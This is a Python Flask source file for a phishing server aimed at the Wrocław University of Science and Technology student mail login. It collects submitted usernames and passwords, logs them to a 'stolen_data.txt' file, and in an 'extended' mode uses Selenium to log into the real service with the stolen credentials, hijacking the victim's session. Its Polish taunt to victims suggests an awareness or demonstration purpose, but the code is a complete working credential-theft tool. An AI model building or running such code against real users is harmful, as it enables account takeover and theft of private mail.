from flask import Flask, jsonify, request, jsonify, render_template, redirect, url_for
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from getpass import getpass
import pickle
from datetime import datetime
import os

extended = False
usr = ""
pwd = ""
ASSETS_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder='.')
pwrServiceUrl = "https://s.student.pwr.edu.pl/iwc_static/c11n/login_student_pwr_edu_pl.html?lang=pl-PL&3.0.1.3.0_16070546&svcs=abs,mail,calendar,c11n"


def save_data(user, password):
    f = open("stolen_data.txt", "w")
    f.write("================================\n")
    now = datetime.now()
    f.write(str(now)+"\n")
    f.write("================================\n")
    f.write("page url: "+pwrServiceUrl+"\n")
    f.write("login : "+str(user)+"\n")
    f.write("password : "+str(password)+"\n")
    f.close()


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/', methods=['POST'])
def my_form_post():
    if request.method == "POST":
        user = request.form["username"]
        password = request.form["password"]

        if extended == False:
            save_data(user, password)
            return f" Zostałeś ofiarą ataku ! Przechwycone zostały twoje haslo: <b>{password}</b> oraz login: <b>{user}</b> do poczty studenckiej.\
                 Twoje dni są policzone :("
        else:

            save_data(user, password)
            usr = user
            pwd = password

            driver = webdriver.Firefox()
            driver.get(pwrServiceUrl)

            username_box = driver.find_element_by_id('username')
            username_box.send_keys(usr)

            password_box = driver.find_element_by_id('password')
            password_box.send_keys(pwd)

            login_btn = driver.find_element_by_id('signin')
            login_btn.submit()

            # return f" Zostałeś ofiarą ataku ! Przechwycone zostały twoje haslo: <b>{password}</b> oraz login: <b>{user}</b> do poczty studenckiej.\
            #     Twoje dni są policzone :( Naciesz się swoją przechwyconą sesją poczty studenckiej w nowej karcie (o ile dane były poprawne) :)"
            return index()
    else:
        return redirect(pwrServiceUrl)


if __name__ == '__main__':
    context = ('certA.crt', 'privkeyA.pem')
    app.run(debug=True, ssl_context=context)
